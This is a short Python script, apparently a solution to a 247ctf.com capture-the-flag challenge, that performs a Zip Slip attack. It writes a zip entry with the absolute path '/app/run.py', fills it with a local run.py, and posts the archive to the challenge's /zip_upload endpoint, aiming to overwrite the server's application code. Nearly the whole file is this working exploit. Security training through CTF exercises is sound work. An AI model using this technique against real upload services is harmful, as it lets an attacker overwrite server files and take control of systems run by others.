import requests
import zipfile
from io import BytesIO


def create_basic_zip(output_filename, file_path, file_content):
    f = BytesIO()

    if isinstance(file_content, str):
        file_content = file_content.encode("utf-8")

    with zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED) as z:
        # Zip Slip exploit with arbitrary file path
        z.writestr(file_path, file_content)

    with open(output_filename, "wb") as zip_file:
        zip_file.write(f.getvalue())


def upload_zip(zip_path):
    url = "https://c895c5b27d8a48cd.247ctf.com/"
    with open(zip_path, "rb") as f:
        r = requests.post(
            url + "/zip_upload",
            files={"zarchive": ("test.zip", f, "application/octet-stream")},
        )
        print(r.text)


content = open("./run.py", "rb").read()
create_basic_zip("test.zip", "/app/run.py", content)
upload_zip("test.zip")
